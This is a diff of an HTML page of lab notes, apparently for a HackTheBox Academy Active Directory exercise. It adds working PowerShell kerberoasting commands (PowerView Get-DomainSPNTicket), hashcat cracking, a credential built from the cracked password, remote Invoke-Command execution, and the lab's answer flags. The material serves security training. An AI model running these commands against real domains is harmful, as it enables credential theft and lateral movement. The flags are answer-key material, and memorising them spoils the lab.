@@ -22764,7 +22764,7 @@ Results: ACADEMY-EA-DC01</p>
 <span class="normal"><a href="#__codelineno-240-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-240-1"><a id="__codelineno-240-1" name="__codelineno-240-1"></a># Enter in http:\\$ip\uploads
 </span><span id="__span-240-2"><a id="__codelineno-240-2" name="__codelineno-240-2"></a># Enter creds
 </span><span id="__span-240-3"><a id="__codelineno-240-3" name="__codelineno-240-3"></a># Run in the terminal
-</span><span id="__span-240-4"><a id="__codelineno-240-4" name="__codelineno-240-4"></a>c:\Users\Administrator\Desktop\flag.txt
+</span><span id="__span-240-4"><a id="__codelineno-240-4" name="__codelineno-240-4"></a>type c:\Users\Administrator\Desktop\flag.txt
 </span></code></pre></div></td></tr></table></div>
 <p>Results: JusT_g3tt1ng_st@rt3d!</p>
 <p><strong>Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer</strong></p>
@@ -22784,7 +22784,7 @@ Results: ACADEMY-EA-DC01</p>
 </span><span id="__span-241-6"><a id="__codelineno-241-6" name="__codelineno-241-6"></a># MSSQLSvc/SQL01.inlanefreight.local:1433
 </span><span id="__span-241-7"><a id="__codelineno-241-7" name="__codelineno-241-7"></a>
 </span><span id="__span-241-8"><a id="__codelineno-241-8" name="__codelineno-241-8"></a># Also you can enumerate them by uploading the PowerView.ps1 the antak Choose File and Upload the file. In that case, the command line will be used to indicate the path. After that, you need to import-module every time you are going to use the cmdlet because the command line does not maintain the state. Everything runs in the context of the command.
-</span><span id="__span-241-9"><a id="__codelineno-241-9" name="__codelineno-241-9"></a>cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.psm1 ; Get-DomainUser * -spn | select samaccountname
+</span><span id="__span-241-9"><a id="__codelineno-241-9" name="__codelineno-241-9"></a>cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.ps1 ; Get-DomainUser * -spn | select samaccountname
 </span></code></pre></div></td></tr></table></div>
 <p>Results:  svc_sql</p>
 <p><strong>Crack the account's password. Submit the cleartext value.</strong></p>
@@ -22793,7 +22793,7 @@ Results: ACADEMY-EA-DC01</p>
 <span class="normal"><a href="#__codelineno-242-3">3</a></span>
 <span class="normal"><a href="#__codelineno-242-4">4</a></span>
 <span class="normal"><a href="#__codelineno-242-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-242-1"><a id="__codelineno-242-1" name="__codelineno-242-1"></a># Obtain the ticket
-</span><span id="__span-242-2"><a id="__codelineno-242-2" name="__codelineno-242-2"></a>cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.psm1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash &gt; file.txt ; cat file.txt
+</span><span id="__span-242-2"><a id="__codelineno-242-2" name="__codelineno-242-2"></a>cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash &gt; file.txt ; cat file.txt
 </span><span id="__span-242-3"><a id="__codelineno-242-3" name="__codelineno-242-3"></a>
 </span><span id="__span-242-4"><a id="__codelineno-242-4" name="__codelineno-242-4"></a># Copy ticket to the file sqlservice in my attacker machine and crack it:
 </span><span id="__span-242-5"><a id="__codelineno-242-5" name="__codelineno-242-5"></a>hashcat -m 13100 sqlserver /usr/share/wordlists/rockyou.txt
@@ -22801,12 +22801,48 @@ Results: ACADEMY-EA-DC01</p>
 <p>Results: lucky7</p>
 <p><strong>Submit the contents of the flag.txt file on the Administrator desktop on MS01</strong></p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-243-1">1</a></span>
-<span class="normal"><a href="#__codelineno-243-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-243-1"><a id="__codelineno-243-1" name="__codelineno-243-1"></a># Create a SecureString object
-</span><span id="__span-243-2"><a id="__codelineno-243-2" name="__codelineno-243-2"></a>$password = ConvertTo-SecureString &quot;lucky7&quot; -AsPlainText -Force; $cred = new-object System.Management.Automation.PSCredential (&quot;INLANEFREIGHT\svc_sql&quot;, $password) ; Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+<span class="normal"><a href="#__codelineno-243-2">2</a></span>
+<span class="normal"><a href="#__codelineno-243-3">3</a></span>
+<span class="normal"><a href="#__codelineno-243-4">4</a></span>
+<span class="normal"><a href="#__codelineno-243-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-243-1"><a id="__codelineno-243-1" name="__codelineno-243-1"></a># We upload the file Microsoft.ActiveDirectory.Management.dll from the Active Directory powershell module and now we can use it to enumerate computers
+</span><span id="__span-243-2"><a id="__codelineno-243-2" name="__codelineno-243-2"></a>Import-Module .\Microsoft.ActiveDirectory.Management.dll; Get-ADComputer -Filter * | Select-Object Name 
+</span><span id="__span-243-3"><a id="__codelineno-243-3" name="__codelineno-243-3"></a>
+</span><span id="__span-243-4"><a id="__codelineno-243-4" name="__codelineno-243-4"></a># We need to concatenate commands with semi-colon. The following commands create a Secure-string object with the credential of the user svc_sql. Then we will use Invoke-Command to run a command in the remote host MS01
+</span><span id="__span-243-5"><a id="__codelineno-243-5" name="__codelineno-243-5"></a>$password = ConvertTo-SecureString &quot;lucky7&quot; -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential &quot;INLANEFREIGHT\svc_sql&quot;, $password; Invoke-Command -ComputerName &quot;MS01.INLANEFREIGHT.LOCAL&quot; -Credential $cred -ScriptBlock { Get-Content &quot;C:\Users\Administrator\Desktop\flag.txt&quot; }
 </span></code></pre></div></td></tr></table></div>
-<p>Results:</p>
+<p>Results: spn$<em>r0ast1ng_on</em>@n_0p3n_f1re</p>
 <p><strong>Find cleartext credentials for another domain user. Submit the username as your answer.</strong></p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-244-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-244-1"><a id="__codelineno-244-1" name="__codelineno-244-1"></a>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-244-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-244-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-244-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-244-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-244-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-244-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-244-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-244-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-244-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-244-10">10</a></span>
+<span class="normal"><a href="#__codelineno-244-11">11</a></span>
+<span class="normal"><a href="#__codelineno-244-12">12</a></span>
+<span class="normal"><a href="#__codelineno-244-13">13</a></span>
+<span class="normal"><a href="#__codelineno-244-14">14</a></span>
+<span class="normal"><a href="#__codelineno-244-15">15</a></span>
+<span class="normal"><a href="#__codelineno-244-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-244-1"><a id="__codelineno-244-1" name="__codelineno-244-1"></a># Enumerate SPNs with
+</span><span id="__span-244-2"><a id="__codelineno-244-2" name="__codelineno-244-2"></a>setspn.exe -Q */*
+</span><span id="__span-244-3"><a id="__codelineno-244-3" name="__codelineno-244-3"></a>
+</span><span id="__span-244-4"><a id="__codelineno-244-4" name="__codelineno-244-4"></a># backupjob looks like a promising user. FRom the previous output we also know:
+</span><span id="__span-244-5"><a id="__codelineno-244-5" name="__codelineno-244-5"></a># backupjob/veam001.inlanefreight.local
+</span><span id="__span-244-6"><a id="__codelineno-244-6" name="__codelineno-244-6"></a>Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN backupjob/veam001.inlanefreight.local -OutputFormat Hashcat | select -ExpandProperty Hash &gt; file.txt ; cat file.txt
+</span><span id="__span-244-7"><a id="__codelineno-244-7" name="__codelineno-244-7"></a>
+</span><span id="__span-244-8"><a id="__codelineno-244-8" name="__codelineno-244-8"></a>sqldev
+</span><span id="__span-244-9"><a id="__codelineno-244-9" name="__codelineno-244-9"></a>MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
+</span><span id="__span-244-10"><a id="__codelineno-244-10" name="__codelineno-244-10"></a>Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL-DEV01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash &gt; file.txt ; cat file.txt
+</span><span id="__span-244-11"><a id="__codelineno-244-11" name="__codelineno-244-11"></a>
+</span><span id="__span-244-12"><a id="__codelineno-244-12" name="__codelineno-244-12"></a>sqlprod
+</span><span id="__span-244-13"><a id="__codelineno-244-13" name="__codelineno-244-13"></a>MSSQLSvc/SQL02.inlanefreight.local:1433
+</span><span id="__span-244-14"><a id="__codelineno-244-14" name="__codelineno-244-14"></a>Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL02.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash &gt; file.txt ; cat file.txt
+</span><span id="__span-244-15"><a id="__codelineno-244-15" name="__codelineno-244-15"></a>
+</span><span id="__span-244-16"><a id="__codelineno-244-16" name="__codelineno-244-16"></a>Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN krbtgt/DC01.INLANEFREIGHT.LOCAL -OutputFormat Hashcat | select -ExpandProperty Hash &gt; file.txt ; cat file.txt
 </span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
 <p><strong>Submit this user's cleartext password.</strong></p>
@@ -23588,7 +23624,7 @@ Results: ACADEMY-EA-DC01</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-02T19:07:53+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-02</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-03T20:08:12+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-03</span></small></br>
 
 
     <small>Created: May 31, 2024 18:03:27</small>
